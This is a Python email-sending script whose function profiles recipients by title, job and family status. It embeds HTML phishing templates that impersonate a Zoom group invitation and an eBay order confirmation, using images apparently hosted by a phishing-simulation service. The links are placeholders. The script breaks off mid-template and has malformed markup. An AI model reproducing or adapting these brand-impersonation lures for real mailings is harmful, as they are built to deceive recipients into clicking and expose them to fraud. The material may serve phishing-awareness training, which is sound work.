import smtplib
import ssl
from getpass import getpass
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import sys
from email.mime.application import MIMEApplication


def send_email(sender_email, password, receiver_email, title, job_title, personal_status, kids_status):
    message = MIMEMultipart("alternative")
    parts = receiver_email.split("@")
    username = parts[0]
    message["Subject"] = "Hello " + username
    message["From"] = sender_email
    message["To"] = receiver_email

    if title == "Ms" or title == "Mrs":
        html = """\
<html>
<head>
    <!--[if (mso 16)]>
    <style type="text/css">
        a {text-decoration: none;}
    </style>
    <![endif]-->
    <!--[if gte mso 9]>
    <style>sup { font-size: 100% !important; }</style>
    <![endif]-->
    <style type="text/css">
        @media only screen and (max-width:600px) {
            p, ul li, ol li, a {
                font-size:16px!important;
                line-height:150%!important
            }

            h1 {
                font-size:30px!important;
                text-align:center;
                line-height:120%!important
            }

            h2 {
                font-size:26px!important;
                text-align:center;
                line-height:120%!important
            }

            h3 {
                font-size:20px!important;
                text-align:center;
                line-height:120%!important
            }

            h1 a {
                font-size:30px!important
            }

            h2 a {
                font-size:26px!important
            }

            h3 a {
                font-size:20px!important
            }

            .es-menu td a {
                font-size:16px!important
            }

            .es-header-body p, .es-header-body ul li, .es-header-body ol li, .es-header-body a {
                font-size:16px!important
            }

            .es-footer-body p, .es-footer-body ul li, .es-footer-body ol li, .es-footer-body a {
                font-size:16px!important
            }

            .es-infoblock p, .es-infoblock ul li, .es-infoblock ol li, .es-infoblock a {
                font-size:12px!important
            }

            *[class="gmail-fix"] {
                display:none!important
            }

            .es-m-txt-c, .es-m-txt-c h1, .es-m-txt-c h2, .es-m-txt-c h3 {
                text-align:center!important
            }

            .es-m-txt-r, .es-m-txt-r h1, .es-m-txt-r h2, .es-m-txt-r h3 {
                text-align:right!important
            }

            .es-m-txt-l, .es-m-txt-l h1, .es-m-txt-l h2, .es-m-txt-l h3 {
                text-align:left!important
            }

            .es-m-txt-r img, .es-m-txt-c img, .es-m-txt-l img {
                display:inline!important
            }

            .es-button-border {
                display:block!important
            }

            a.es-button {
                font-size:20px!important;
                display:block!important;
                border-width:10px 0px 10px 0px!important
            }

            .es-btn-fw {
                border-width:10px 0px!important;
                text-align:center!important
            }

            .es-adaptive table, .es-btn-fw, .es-btn-fw-brdr, .es-left, .es-right {
                width:100%!important
            }

            .es-content table, .es-header table, .es-footer table, .es-content, .es-footer, .es-header {
                width:100%!important;
                max-width:600px!important
            }

            .es-adapt-td {
                display:block!important;
                width:100%!important
            }

            .adapt-img {
                width:100%!important;
                height:auto!important
            }

            .es-m-p0 {
                padding:0px!important
            }

            .es-m-p0r {
                padding-right:0px!important
            }

            .es-m-p0l {
                padding-left:0px!important
            }

            .es-m-p0t {
                padding-top:0px!important
            }

            .es-m-p0b {
                padding-bottom:0!important
            }

            .es-m-p20b {
                padding-bottom:20px!important
            }

            .es-mobile-hidden, .es-hidden {
                display:none!important
            }

            .es-desk-hidden {
                display:table-row!important;
                width:auto!important;
                overflow:visible!important;
                float:none!important;
                max-height:inherit!important;
                line-height:inherit!important
            }

            .es-desk-menu-hidden {
                display:table-cell!important
            }

            table.es-table-not-adapt, .esd-block-html table {
                width:auto!important
            }

            table.es-social {
                display:inline-block!important
            }

            table.es-social td {
                display:inline-block!important
            }
        }

        #outlook a {
            padding:0;
        }

        .ExternalClass {
            width:100%;
        }

        .ExternalClass, .ExternalClass p, .ExternalClass span, .ExternalClass font, .ExternalClass td, .ExternalClass div {
            line-height:100%;
        }

        .es-button {
            mso-style-priority:100!important;
            text-decoration:none!important;
        }

        a[x-apple-data-detectors] {
            color:inherit!important;
            text-decoration:none!important;
            font-size:inherit!important;
            font-family:inherit!important;
            font-weight:inherit!important;
            line-height:inherit!important;
        }

        .es-desk-hidden {
            display:none;
            float:left;
            overflow:hidden;
            width:0;
            max-height:0;
            line-height:0;
            mso-hide:all;
        }
    </style>
</head>
<body>
    <div class="es-wrapper-color" style="background-color:#EEEEEE;">
        <!--[if gte mso 9]>
        <v:background xmlns:v="urn:schemas-microsoft-com:vml" fill="t">
            <v:fill type="tile" color="#EEEEEE" origin="0.5, 0" position="0.5,0"></v:fill>
        </v:background><![endif]-->
        <table cellpadding="0" cellspacing="0" class="es-wrapper" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;padding:0;Margin:0;width:100%;height:100%;background-repeat:repeat;background-position:center top;" width="100%">
            <tbody>
                <tr style="border-collapse:collapse;">
                    <td style="padding:0;Margin:0;" valign="top">
                        <table align="center" cellpadding="0" cellspacing="0" class="es-content" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;table-layout:fixed !important;width:100%;">
                            <tbody>
                                <tr style="border-collapse:collapse;">
                                    <td align="center" style="padding:0;Margin:0;">
                                        <table align="center" bgcolor="#ffffff" cellpadding="0" cellspacing="0" class="es-content-body" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;background-color:#FFFFFF;" width="600">
                                            <tbody>
                                                <tr style="border-collapse:collapse;">
                                                    <td align="left" style="padding:0;Margin:0;padding-top:20px;padding-left:20px;padding-right:20px;">
                                                        <!--[if mso]>
                                                        <table width="560" cellpadding="0" cellspacing="0">
                                                            <tr>
                                                                <td width="389" valign="top"><![endif]-->
                                                        <table align="left" cellpadding="0" cellspacing="0" class="es-left" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;float:left;">
                                                            <tbody>
                                                                <tr style="border-collapse:collapse;">
                                                                    <td align="left" class="es-m-p20b" style="padding:0;Margin:0;" width="389">
                                                                        <table cellpadding="0" cellspacing="0" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;" width="100%">
                                                                            <tbody>
                                                                                <tr style="border-collapse:collapse;">
                                                                                    <td align="left" style="padding:0;Margin:0;font-size:0px;">
                                                                                        <a href="javascript:;window.parent.$('#webModal').modal('show');">
                                                                                            <img alt="" class="adapt-img" height="30" src="https://caniphish.s3.ap-southeast-2.amazonaws.com/EmailTemplates/Common/images/zoom-logo.png" style="display:block;border:0;outline:none;text-decoration:none;-ms-interpolation-mode:bicubic;" width="130">
                                                                                        </a>
                                                                                    </td>
                                                                                </tr>
                                                                            </tbody>
                                                                        </table>
                                                                    </td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                        <!--[if mso]></td><td width="20"></td><td width="151" valign="top"><![endif]-->
                                                        <!--[if mso]></td></tr></table><![endif]-->
                                                    </td>
                                                </tr>
                                                <tr style="border-collapse:collapse;">
                                                    <td align="left" style="padding:0;Margin:0;padding-top:5px;">
                                                        <table cellpadding="0" cellspacing="0" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;" width="100%">
                                                            <tbody>
                                                                <tr style="border-collapse:collapse;">
                                                                    <td align="center" style="padding:0;Margin:0;" valign="top" width="600">
                                                                        <table cellpadding="0" cellspacing="0" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;border-bottom:2px solid #CCCCCC;" width="100%">
                                                                            <tbody>
                                                                                <tr style="border-collapse:collapse;">
                                                                                    <td align="left" class="es-m-txt-l" style="padding:0;Margin:0;padding-bottom:5px;padding-left:20px;padding-right:20px;">
                                                                                        <h3 style="Margin:0;line-height:24px;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;font-size:20px;font-style:normal;font-weight:normal;color:#333333;">&nbsp;</h3>
                                                                                    </td>
                                                                                </tr>
                                                                            </tbody>
                                                                        </table>
                                                                    </td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </td>
                                                </tr>
                                                <tr style="border-collapse:collapse;">
                                                    <td align="left" style="padding:0;Margin:0;padding-top:20px;padding-bottom:20px;padding-left:20px;padding-right:20px;">
                                                        <table cellpadding="0" cellspacing="0" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;" width="100%">
                                                            <tbody>
                                                                <tr style="border-collapse:collapse;">
                                                                    <td align="center" style="padding:0;Margin:0;" valign="top" width="560">
                                                                        <table cellpadding="0" cellspacing="0" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;" width="100%">
                                                                            <tbody>
                                                                                <tr style="border-collapse:collapse;">
                                                                                    <td align="left" style="padding:0;Margin:0;padding-top:20px;">
                                                                                        <p style="Margin:0;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-size:14px;font-family:helvetica, 'helvetica neue', arial, verdana, sans-serif;line-height:21px;color:#696969;">Hello<br>
                                                                                            <br>
                                                                                            You're invited to join the "Quarterly All Hands" Zoom group. Click the button below to join the group as soon as is convenient.
                                                                                        </p>
                                                                                    </td>
                                                                                </tr>
                                                                                <tr style="border-collapse:collapse;">
                                                                                    <td align="center" style="padding:10px;Margin:0;">
                                                                                        <a class="es-button" href="https://en.wikipedia.org/wiki/GitHub" style="mso-style-priority:100 !important;text-decoration:none;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-family:helvetica, 'helvetica neue', arial, verdana, sans-serif;font-size:18px;color:#FFFFFF;border-style:solid;border-color:#2D8CFF;border-width:10px 20px 10px 20px;display:inline-block;background:#2D8CFF;border-radius:0px;font-weight:normal;font-style:normal;line-height:22px;width:auto;text-align:center;">Confirm Account</a>
                                                                                    </td>
                                                                                </tr>
                                                                                <tr style="border-collapse:collapse;">
                                                                                    <td align="left" style="padding:0;Margin:0;padding-top:15px;">
                                                                                        <p style="Margin:0;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-size:14px;font-family:helvetica, 'helvetica neue', arial, verdana, sans-serif;line-height:21px;color:#333333;"><span style="color:#696969;">Questions? Please visit our</span> <a href="https://en.wikipedia.org/wiki/GitHub"><span style="color:#2D8CFF;"><strong>Support Center</strong></span></a>.</p>
                                                                                    </td>
                                                                                </tr>
                                                                                <tr style="border-collapse:collapse;">
                                                                                    <td align="left" style="padding:0;Margin:0;padding-top:20px;">
                                                                                        <p style="Margin:0;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-size:14px;font-family:helvetica, 'helvetica neue', arial, verdana, sans-serif;line-height:21px;color:#696969;">Happy Zooming!</p>
                                                                                    </td>
                                                                                </tr>
                                                                            </tbody>
                                                                        </table>
                                                                    </td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                        <table align="center" cellpadding="0" cellspacing="0" class="es-footer" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;table-layout:fixed !important;width:100%;background-color:transparent;background-repeat:repeat;background-position:center top;">
                            <tbody>
                                <tr style="border-collapse:collapse;">
                                    <td align="center" style="padding:0;Margin:0;">
                                        <table align="center" cellpadding="0" cellspacing="0" class="es-footer-body" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;background-color:transparent;" width="600">
                                            <tbody>
                                                <tr style="border-collapse:collapse;">
                                                    <td align="left" bgcolor="#C6C6C6" style="Margin:0;padding-top:20px;padding-bottom:20px;padding-left:20px;padding-right:20px;background-color:#C6C6C6;">
                                                        <table cellpadding="0" cellspacing="0" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;" width="100%">
                                                            <tbody>
                                                                <tr style="border-collapse:collapse;">
                                                                    <td align="center" style="padding:0;Margin:0;" valign="top" width="560">
                                                                        <table cellpadding="0" cellspacing="0" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px;" width="100%">
                                                                            <tbody>
                                                                                <tr style="border-collapse:collapse;">
                                                                                    <td align="center" style="padding:0;Margin:0;padding-top:10px;padding-bottom:10px;">
                                                                                        <p style="Margin:0;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-size:12px;font-family:helvetica, 'helvetica neue', arial, verdana, sans-serif;line-height:18px;color:#696969;">+1.888.778.4873<br>
                                                                                            © 2022 Zoom - All Rights Reserved</p>
                                                                                    </td>
                                                                                </tr>
                                                                            </tbody>
                                                                        </table>
                                                                    </td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>
    <style>
        a {
            cursor: pointer;
        }
    </style>
</body>
</html>


"""


    else:
    	html = """\
<html><head> 
  <meta charset="utf-8"> 
 </head> 
 <body> 
  <table align="center" border="0" cellpadding="0" cellspacing="0" style="font-family: courier new; width: 700px;"> 
   <tbody> 
    <tr> 
     <td align="left" valign="top"> 
      <div class="a3s" id=":1id" style="overflow: hidden;">
        &nbsp; 
      </div> 
      <table border="0" cellpadding="0" cellspacing="0" style="width: 100%;"> 
       <tbody> 
        <tr> 
        </tr> 
       </tbody> 
      </table> 
      <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 100%; border: none;" bgcolor="#f9f9f9"> 
       <tbody> 
        <tr> 
         <td style="border-collapse: collapse !important; border-spacing: 0 !important; border: none;" valign="top" width="100%"> 
          <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 600px; border: none;" bgcolor="#F9F9F9"> 
           <tbody> 
            <tr> 
             <td style="border-collapse: collapse !important; border-spacing: 0 !important; padding: 0; border: none;" valign="top"> <p style="color: #888888; font-family: Helvetica,Arial,sans-serif; font-size: 11px; font-weight: normal; line-height: normal; margin: 5px 0 10px;" align="left">Confirmed. <span class="il">eBay</span> will update the estimate when it ships.</p> </td> 
            </tr> 
           </tbody> 
          </table> 
          <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 100%; border: none;" bgcolor="#F9F9F9"> 
           <tbody> 
            <tr> 
             <td align="center" height="7" style="border-collapse: collapse !important; border-spacing: 0 !important; background-image: 'images/SiteEmail_Preheader_Shadow.png'; border: none;" valign="top" width="100%">&nbsp;</td> 
            </tr> 
           </tbody> 
          </table> </td> 
        </tr> 
       </tbody> 
      </table> 
      <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 100%; border: none;" bgcolor="#f9f9f9"> 
       <tbody> 
        <tr> 
         <td style="border-collapse: collapse !important; border-spacing: 0 !important; border: none;" valign="top" width="100%"> 
          <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 600px; border: none;"> 
           <tbody> 
            <tr> 
             <td style="border-collapse: collapse !important; border-spacing: 0 !important; padding: 15px 0 20px; border: none;" valign="top"><a href="javascript:;window.parent.$('#webModal').modal('show');" style="text-decoration: none; color: #0654ba;"><img align="left" alt="eBay" border="0" class="CToWUd" height="46" src="https://caniphish.s3.ap-southeast-2.amazonaws.com/EmailTemplates/Common/images/ebay-item-logo.png" style="display: inline block; outline: none; text-decoration: none; border: none;" width="132"></a></td> 
            </tr> 
           </tbody> 
          </table> </td> 
        </tr> 
       </tbody> 
      </table> 
      <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 100%; border: none;" bgcolor="#f9f9f9"> 
       <tbody> 
        <tr> 
         <td style="border-collapse: collapse !important; border-spacing: 0 !important; border: none;" valign="top" width="100%"> 
          <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 600px; border: none;" bgcolor="#F9F9F9"> 
           <tbody> 
            <tr> 
             <td style="border-collapse: collapse !important; border-spacing: 0 !important; border: none;" valign="top"> <h3 style="color: #333333; font-family: Helvetica,Arial,sans-serif; font-size: 16px; font-weight: normal; line-height: 19px; margin: 0 0 10px;" align="left">Hi <?php include 'username.txt'; ?> - Order confirmed. <span class="il">eBay</span> will update you when your order ships.</h3> </td> 
            </tr> 
            <tr> 
             <td align="left" style="border-collapse: collapse !important; border-spacing: 0 !important; font-family: Helvetica,Arial,sans-serif; font-size: 20px; line-height: 16px; font-weight: bold; padding-bottom: 10px; border: none;">PAID : $359.99 with Paypal 
              <div style="color: #2f9a5d; font-size: 15px;"> 
               <br> You can use the access code 
               <strong>DTFJ51WI</strong> to track this order. $36.00 shipping discount applied. 
              </div> </td> 
            </tr> 
           </tbody> 
          </table> </td> 
        </tr> 
       </tbody> 
      </table> 
      <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 100%; border: none;" bgcolor="#f9f9f9"> 
       <tbody> 
        <tr> 
         <td style="border-collapse: collapse !important; border-spacing: 0 !important; border: none;" valign="top" width="100%">&nbsp;</td> 
        </tr> 
       </tbody> 
      </table> 
      <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 100%; border: none;" bgcolor="#f9f9f9"> 
       <tbody> 
        <tr> 
         <td style="border-collapse: collapse !important; border-spacing: 0 !important; border: none;" valign="top" width="100%"> 
          <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 600px; border: none;"> 
           <tbody> 
            <tr> 
             <td style="border-collapse: collapse !important; border-spacing: 0 !important; padding: 10px 0 15px; border: none;" valign="top"> 
              <table align="left" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; border: none;"> 
               <tbody> 
                <tr> 
                <a class="es-button" href="https://en.wikipedia.org/wiki/GitHub" style="mso-style-priority:100 !important;text-decoration:none;-webkit-text-size-adjust:none;-ms-text-size-adjust:none;mso-line-height-rule:exactly;font-family:helvetica, 'helvetica neue', arial, verdana, sans-serif;font-size:18px;color:#FFFFFF;border-style:solid;border-color:#2D8CFF;border-width:10px 20px 10px 20px;display:inline-block;background:#2D8CFF;border-radius:0px;font-weight:normal;font-style:normal;line-height:22px;width:auto;text-align:center;">Track Your Order</a>
                </Cr> 
               </tbody> 
              </table> </td> 
            </tr> 
           </tbody> 
          </table> </td> 
        </tr> 
       </tbody> 
      </table> 
      <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 100%; border: none;" bgcolor="#f9f9f9"> 
       <tbody> 
        <tr> 
         <td style="border-collapse: collapse !important; border-spacing: 0 !important; border: none;" valign="top" width="100%"> 
          <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 600px; border: none;" bgcolor="#F9F9F9"> 
           <tbody> 
            <tr> 
             <td style="border-collapse: collapse !important; border-spacing: 0 !important; padding: 25px 0 50px; border: none;" valign="top"> 
              <table align="left" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; float: left !important; width: 200px; padding: 0; border: 1px solid #dddddd;" bgcolor="#ffffff"> 
               <tbody> 
                <tr> 
                 <td align="center" height="200" style="border-collapse: collapse !important; border-spacing: 0 !important; border: none;" valign="center" width="200" bgcolor="#ffffff"><a href="javascript:;window.parent.$('#webModal').modal('show');" style="text-decoration: none; color: #0654ba;"><img alt="Vizio 32-inch" border="0" class="CToWUd" src="https://caniphish.s3.ap-southeast-2.amazonaws.com/EmailTemplates/Common/images/ebay-big-screen.png" style="display: block; outline: none; text-decoration: none; border-radius: 3px; margin: 0; border: 0;"></a></td> 
                </tr> 
               </tbody> 
              </table> 
              <table align="left" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; display: block; width: 376px; border: none;"> 
               <tbody> 
                <tr> 
                 <td style="padding-left: 20px; border-collapse: collapse !important; border-spacing: 0 !important; border: none;" valign="top"> <h2 style="color: #333333; font-family: Helvetica,Arial,sans-serif; font-size: 16px; font-weight: normal; line-height: 20px; margin: 0 0 10px;" align="left"><a href="javascript:;window.parent.$('#webModal').modal('show');" style="text-decoration: none; color: #0654ba;">Vizio M322i-B1 32-inch class 1080p 120Hz Smart LED HDTV with Built-in Wi-Fi</a></h2> </td> 
                </tr> 
                <tr> 
                 <td align="left" style="padding-left: 20px; border-collapse: collapse !important; border-spacing: 0 !important; font-family: Helvetica,Arial,sans-serif; font-size: 15px; padding-top: 2px; border: none;">Estimated delivery: Mon.</td> 
                </tr> 
                <tr> 
                 <td align="left" style="padding-left: 20px; border-collapse: collapse !important; border-spacing: 0 !important; font-family: Helvetica,Arial,sans-serif; font-size: 14px; color: #666666; border: none;"> <br> Item Id: 131328854534<br> Transaction Id 1069432213003</td> 
                </tr> 
                <tr> 
                 <td align="left" style="border-collapse: collapse !important; border-spacing: 0 !important; font-family: Helvetica,Arial,sans-serif; font-size: 12px; padding-top: 2px; border: none;">&nbsp;</td> 
                </tr> 
               </tbody> 
              </table> </td> 
            </tr> 
           </tbody> 
          </table> </td> 
        </tr> 
       </tbody> 
      </table> 
      <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; border-top-width: 1px; border: none; border-top-color: #dddddd; width: 100%;" bgcolor="#ffffff"> 
       <tbody> 
        <tr> 
         <td style="border-collapse: collapse !important; border-spacing: 0 !important; border: none;" valign="top" width="100%"> 
          <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 600px; border: none;"> 
           <tbody> 
            <tr> 
             <td>&nbsp;</td> 
            </tr> 
            <tr> 
             <td style="border-collapse: collapse !important; border-spacing: 0 !important; border-bottom-color: #dddddd; border-bottom-width: 1px; padding: 40px 0 5px; border-style: none none solid;" valign="top"> <h1 style="color: #333333; font-family: Helvetica,Arial,sans-serif; font-size: 24px; font-weight: normal; line-height: 28px; margin: 0 0 14px;" align="left">To complement your purchase</h1> </td> 
            </tr> 
            <tr> 
             <td style="border-collapse: collapse !important; border-spacing: 0 !important; border: none;" valign="top"> 
              <table align="left" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 150px; border: none;"> 
               <tbody> 
                <tr> 
                 <td style="border-collapse: collapse !important; border-spacing: 0 !important; padding: 10px 16px; border: none;" valign="top"> 
                  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 100%; border: none;"> 
                   <tbody> 
                    <tr> 
                     <td> 
                      <table cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 115px; padding: 0; border: none;"> 
                       <tbody> 
                        <tr> 
                         <td align="center" height="115" style="border: 1px solid #dddddd;" valign="center" width="115"><a href="javascript:;window.parent.$('#webModal').modal('show');"><span style="border-radius: 3px; display: block; outline: none; text-decoration: none; margin: 0;"><img border="”0&quot;" class="CToWUd" src="https://caniphish.s3.ap-southeast-2.amazonaws.com/EmailTemplates/Common/images/ebay-small-1.png"></span></a></td> 
                        </tr> 
                       </tbody> 
                      </table> </td> 
                    </tr> 
                    <tr> 
                     <td style="border-collapse: collapse !important; border-spacing: 0 !important; padding: 10px 0 0; border: none;" valign="top"> <h3 style="color: #333333; font-family: Helvetica,Arial,sans-serif; font-size: 13px; font-weight: normal; line-height: normal; word-break: break-all; margin: 0 0 10px;" align="left"><a href="javascript:;window.parent.$('#webModal').modal('show');" style="text-decoration: none; color: #0654ba;">VIZIO P502ui-B1E 50" 4K Ultra HD 120Hz Full Array...</a></h3> </td> 
                    </tr> 
                    <tr> 
                     <td align="left" style="border-collapse: collapse !important; border-spacing: 0 !important; font-family: Helvetica,Arial,sans-serif; font-size: 16px; line-height: 16px; font-weight: bold; padding-bottom: 10px; border: none;">$329.99 <img alt="" class="CToWUd" height="18" src="https://caniphish.s3.ap-southeast-2.amazonaws.com/EmailTemplates/Common/images/ebay-small-5.png" style="display: inline !important; outline: none; text-decoration: none; vertical-align: middle;" width="19"> </td> 
                    </tr> 
                    <tr> 
                     <td align="left" style="border-collapse: collapse !important; border-spacing: 0 !important; font-family: Helvetica,Arial,sans-serif; font-size: 11px; color: #666666; border: none;">Buy it now</td> 
                    </tr> 
                    <tr> 
                     <td align="left" style="border-collapse: collapse !important; border-spacing: 0 !important; font-family: Helvetica,Arial,sans-serif; font-size: 11px; padding-top: 2px; border: none;">Free Shipping</td> 
                    </tr> 
                   </tbody> 
                  </table> </td> 
                </tr> 
               </tbody> 
              </table> 
              <table align="left" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 150px; border: none;"> 
               <tbody> 
                <tr> 
                 <td style="border-collapse: collapse !important; border-spacing: 0 !important; padding: 10px 16px; border: none;" valign="top"> 
                  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 100%; border: none;"> 
                   <tbody> 
                    <tr> 
                     <td> 
                      <table cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 115px; padding: 0; border: none;"> 
                       <tbody> 
                        <tr> 
                         <td align="center" height="115" style="border: 1px solid #dddddd;" valign="center" width="115"><a href="javascript:;window.parent.$('#webModal').modal('show');"><span style="border-radius: 3px; display: block; outline: none; text-decoration: none; margin: 0;"><img alt="" border="”0&quot;" class="CToWUd" src="https://caniphish.s3.ap-southeast-2.amazonaws.com/EmailTemplates/Common/images/ebay-small-2.png"></span></a></td> 
                        </tr> 
                       </tbody> 
                      </table> </td> 
                    </tr> 
                    <tr> 
                     <td style="border-collapse: collapse !important; border-spacing: 0 !important; padding: 10px 0 0; border: none;" valign="top"> <h3 style="color: #333333; font-family: Helvetica,Arial,sans-serif; font-size: 13px; font-weight: normal; line-height: normal; word-break: break-all; margin: 0 0 10px;" align="left"><a href="javascript:;window.parent.$('#webModal').modal('show');" style="text-decoration: none; color: #0654ba;">LG 47LB5800 47" Class Full HD 1080p LED...</a></h3> </td> 
                    </tr> 
                    <tr> 
                     <td align="left" style="border-collapse: collapse !important; border-spacing: 0 !important; font-family: Helvetica,Arial,sans-serif; font-size: 16px; line-height: 16px; font-weight: bold; padding-bottom: 10px; border: none;">$239.99</td> 
                    </tr> 
                    <tr> 
                     <td align="left" style="border-collapse: collapse !important; border-spacing: 0 !important; font-family: Helvetica,Arial,sans-serif; font-size: 11px; color: #666666; border: none;">Buy it now</td> 
                    </tr> 
                    <tr> 
                     <td align="left" style="border-collapse: collapse !important; border-spacing: 0 !important; font-family: Helvetica,Arial,sans-serif; font-size: 11px; padding-top: 2px; border: none;">Free Shipping</td> 
                    </tr> 
                   </tbody> 
                  </table> </td> 
                </tr> 
               </tbody> 
              </table> 
              <table align="left" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 150px; border: none;"> 
               <tbody> 
                <tr> 
                 <td style="border-collapse: collapse !important; border-spacing: 0 !important; padding: 10px 16px; border: none;" valign="top"> 
                  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 100%; border: none;"> 
                   <tbody> 
                    <tr> 
                     <td> 
                      <table cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 115px; padding: 0; border: none;"> 
                       <tbody> 
                        <tr> 
                         <td align="center" height="115" style="border: 1px solid #dddddd;" valign="center" width="115"><a href="javascript:;window.parent.$('#webModal').modal('show');"><span style="border-radius: 3px; display: block; outline: none; text-decoration: none; margin: 0;"><img alt="" border="”0&quot;" class="CToWUd" src="https://caniphish.s3.ap-southeast-2.amazonaws.com/EmailTemplates/Common/images/ebay-small-3.png"></span></a></td> 
                        </tr> 
                       </tbody> 
                      </table> </td> 
                    </tr> 
                    <tr> 
                     <td style="border-collapse: collapse !important; border-spacing: 0 !important; padding: 10px 0 0; border: none;" valign="top"> <h3 style="color: #333333; font-family: Helvetica,Arial,sans-serif; font-size: 13px; font-weight: normal; line-height: normal; word-break: break-all; margin: 0 0 10px;" align="left"><a href="javascript:;window.parent.$('#webModal').modal('show');" style="text-decoration: none; color: #0654ba;">LG 32LB560B 32" Class (31.5") LED HDTV 720p...</a></h3> </td> 
                    </tr> 
                    <tr> 
                     <td align="left" style="border-collapse: collapse !important; border-spacing: 0 !important; font-family: Helvetica,Arial,sans-serif; font-size: 16px; line-height: 16px; font-weight: bold; padding-bottom: 10px; border: none;">$389.99 <img alt="" class="CToWUd" height="18" src="https://caniphish.s3.ap-southeast-2.amazonaws.com/EmailTemplates/Common/images/ebay-small-5.png" style="display: inline !important; outline: none; text-decoration: none; vertical-align: middle;" width="19"> </td> 
                    </tr> 
                    <tr> 
                     <td align="left" style="border-collapse: collapse !important; border-spacing: 0 !important; font-family: Helvetica,Arial,sans-serif; font-size: 11px; color: #666666; border: none;">Buy it now</td> 
                    </tr> 
                    <tr> 
                     <td align="left" style="border-collapse: collapse !important; border-spacing: 0 !important; font-family: Helvetica,Arial,sans-serif; font-size: 11px; padding-top: 2px; border: none;">Free Shipping</td> 
                    </tr> 
                   </tbody> 
                  </table> </td> 
                </tr> 
               </tbody> 
              </table> 
              <table align="left" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 150px; border: none;"> 
               <tbody> 
                <tr> 
                 <td style="border-collapse: collapse !important; border-spacing: 0 !important; padding: 10px 16px; border: none;" valign="top"> 
                  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 100%; border: none;"> 
                   <tbody> 
                    <tr> 
                     <td> 
